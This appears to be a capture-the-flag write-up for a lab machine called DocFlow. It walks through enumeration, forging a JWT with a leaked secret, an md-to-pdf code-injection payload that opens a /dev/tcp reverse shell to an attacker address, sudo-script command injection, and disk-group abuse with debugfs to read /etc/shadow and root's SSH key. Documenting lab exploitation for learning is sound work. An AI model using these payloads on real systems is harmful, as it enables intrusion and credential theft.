# DocFlow — HackingClub

## Machine Information

| Attribute  | Value                                   |
| ---------- | --------------------------------------- |
| Platform   | HackingClub                             |
| Machine    | DocFlow                                 |
| Difficulty | Easy                                    |
| OS         | Linux                                   |
| Category   | Web Exploitation / Privilege Escalation |

---

# Overview

This write-up documents the exploitation process for the **DocFlow** machine on the **HackingClub** platform.

The attack chain involved the following stages:

* Web enumeration
* Source map disclosure
* JWT secret discovery
* JWT privilege escalation
* Remote Code Execution via vulnerable dependency
* Reverse shell access
* Command injection through a privileged script
* Disk group privilege abuse
* Extraction of the root SSH private key
* Root access via SSH

---

# Reconnaissance

The first step was identifying exposed services using **Nmap**.

```bash
nmap -Pn -p- --open --min-rate 1200 <machine-ip> -sVC -vvv
```

Results:

```
22/tcp open  ssh
80/tcp open  http
```

The target exposes:

* **SSH service** on port 22
* **Web application** on port 80

The next step was to analyze the web application.

---

# Web Enumeration

Directory brute forcing was performed using **ffuf**.

```bash
ffuf -u http://<machine-ip>/FUZZ -w common.txt -c -t 100 -fl 1
```

During the enumeration process, an interesting file was discovered:

```
/package.json
```

Accessing this file revealed the **Node.js dependencies used by the application**.

---

# Dependency Analysis

The `package.json` file exposed several backend dependencies, including:

```
express
jsonwebtoken
body-parser
md-to-pdf
```

The **md-to-pdf** library version used by the application is vulnerable to **Arbitrary Code Injection**, affecting versions prior to **5.2.5**.

Although the vulnerability was identified, the functionality responsible for triggering it was initially not accessible to regular users.

This suggested that **additional privileges would be required to reach the vulnerable functionality**.

---

# Account Creation

A new account was created on the web application in order to interact with the platform.

After logging in, the application generated a **JWT authentication token**.

Using the browser developer tools (**F12**), the token was extracted from the application.

---

# Source Map Disclosure

During the inspection of the front-end application, it was discovered that the application was built using **Webpack**, with **source maps enabled**.

Because source maps were publicly accessible, the entire front-end source code became visible in the browser debugger.

This allowed the identification of:

* Internal API routes
* Application logic
* The **JWT signing secret**

Example:

```
token-jwt = eva6C7G4LTdY!p@yMMxb
```

Exposing the JWT signing key represents a **critical security flaw**, as it allows attackers to generate valid authentication tokens.

---

# JWT Privilege Escalation

With the JWT signing secret discovered, it was possible to modify the authentication token.

The original token contained the following attribute:

```
is_premium: false
```

Using tools such as **jwt.io**, the token payload was modified to:

```
is_premium: true
```

The token was then re-signed using the leaked secret.

After replacing the original cookie with the modified token in **DevTools**, the application granted access to **premium features**.

---

# Remote Code Execution

The premium functionality exposed a feature responsible for converting **Markdown files into PDF documents**, implemented using the vulnerable **md-to-pdf** dependency.

Because the library evaluates JavaScript blocks embedded in Markdown, it was possible to inject arbitrary commands.

Payload used:

```markdown
---js
((require("child_process")).execSync("/bin/bash -c 'sh -i >& /dev/tcp/<attacker-ip>/443 0>&1'"))
---
```

---

# Reverse Shell

First, a listener was started on the attacker machine:

```bash
nc -lnvp 443
```

After submitting the malicious Markdown payload, the server executed the command and established a reverse shell.

Access obtained:

```
www-data
```

Verification commands:

```bash
id
whoami
```

---

# Shell Stabilization

To improve shell interaction, a fully interactive TTY shell was spawned.

```bash
script /dev/null -c bash
CTRL + Z
stty raw -echo; fg
```

This allowed proper terminal behavior and command execution.

---

# Privilege Escalation — Axel User

Checking sudo privileges revealed that the **www-data** user could execute a script as the user **axel**.

```bash
sudo -l
```

Result:

```
( axel ) NOPASSWD: /opt/check.sh
```

The script `/opt/check.sh` reads user input and stores it in a variable:

```bash
num=$1
```

This value is later evaluated inside a conditional expression without proper sanitization.

This insecure implementation allows **command injection**.

---

# Command Injection

The vulnerability can be confirmed by injecting a command inside the expression.

Example payload:

```bash
a[$(whoami >&2)]+42
```

The command execution confirms that arbitrary commands are executed by the script.

To obtain a shell as the user **axel**, the following payload was used:

```bash
a[$(bash >&2)]+42
```

Executing:

```bash
sudo -u axel /opt/check.sh
```

resulted in a shell as:

```
axel
```

---

# User Flag

The user flag was located inside Axel's home directory.

Example:

```bash
cd /home/axel
cat user.txt
```

---

# Privilege Escalation — Root

Running the `id` command revealed that the user **axel** belongs to the **disk** group.

```
uid=1001(axel) gid=1001(axel) groups=1001(axel),6(disk)
```

Members of the **disk group** have direct access to block devices, allowing raw disk interaction.

---

# Disk Enumeration

The mounted disk devices were identified using:

```bash
lsblk
```

The root filesystem was located on:

```
/dev/nvme0n1p1
```

---

# Reading System Files

Using **debugfs**, it was possible to interact directly with the filesystem.

```bash
debugfs /dev/nvme0n1p1
```

From within debugfs, sensitive files could be read.

Example:

```
cat /etc/shadow
```

Further exploration allowed extraction of the **root SSH private key**.

---

# Root Access

The extracted key was saved locally.

```bash
nano id
chmod 400 id
```

Then used to authenticate as root:

```bash
ssh -i id root@<machine-ip>
```

Successful access:

```
root
```

---

# Root Flag

The root flag was located in:

```
/root
```

Retrieve it using:

```bash
cat /root/root.txt
```

---

# Skills Practiced

* Nmap reconnaissance
* Web directory enumeration
* Dependency vulnerability analysis
* JWT token manipulation
* Webpack source map analysis
* Remote Code Execution via vulnerable library
* Reverse shell techniques
* Shell stabilization
* Command injection exploitation
* Linux privilege escalation
* Disk group abuse
* SSH private key extraction

---

# Final Result

Machine successfully compromised.

```
User: root
System: Linux
Platform: HackingClub
Machine: DocFlow
Difficulty: Easy
```
